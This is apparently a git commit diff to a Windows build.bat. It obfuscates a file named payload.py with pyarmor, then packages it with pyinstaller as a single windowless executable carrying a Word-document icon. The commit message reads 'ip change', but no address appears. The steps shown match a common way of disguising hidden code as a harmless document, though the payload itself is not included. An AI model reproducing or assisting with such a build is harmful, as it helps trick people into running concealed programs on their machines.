a7fac46b2b3c20e39629d64a388c3dcb72bc92c2
saacidyuusuf <saacidyuusuf871@gmail.com>
2024-12-01 08:22:36 -0500

    ip change

--- build.bat
+++ build.bat
@@ -1,5 +1,5 @@
 @echo off
 
-"C:\Users\K C T\AppData\Local\Programs\Python\Python313\Scripts\pyarmor.exe" obfuscate --recursive payload.py
+"C:\Users\K C T\AppData\Local\Programs\Python\Python313\Scripts\pyarmor-7.exe" obfuscate --recursive payload.py
 
 "C:\Users\K C T\AppData\Local\Programs\Python\Python313\Scripts\pyinstaller.exe" --onefile --noconsole icon=word.ico payload.py
